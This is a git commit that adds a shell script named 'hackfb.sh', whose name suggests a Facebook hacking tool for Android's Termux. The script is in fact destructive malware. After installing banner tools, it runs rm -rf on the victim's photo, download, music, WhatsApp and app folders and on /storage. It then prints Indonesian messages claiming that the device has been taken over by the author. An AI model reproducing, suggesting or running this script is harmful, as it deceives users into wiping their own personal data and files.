2a0a77ed44af196008be129ac1cb6a93133d33de
4R1L-1TX <68058257+4R1L-1TX@users.noreply.github.com>
2020-07-25 10:17:01 +0700

    Add files via upload

---
+++ hackfb.sh
@@ -0,0 +1,25 @@
+pkg install figlet
+gem install lolcat
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf Pictures
+rm -rf SHAREit
+rm -rf KineMaster
+rm -rf pixelLab
+rm -rf DCIM
+rm -rf /storage
+echo "Memperoses Persetujuan Mengambil Alih Perangkat..."
+sleep 2
+echo "Pengambil Alihan Perangkat 50%"
+sleep 2
+echo "SUKSES"
+echo "Perangkat Telah Di Ambil Alih Oleh User : 4R1L-1TX"
+figlet 4R1L-1TX |lolcat
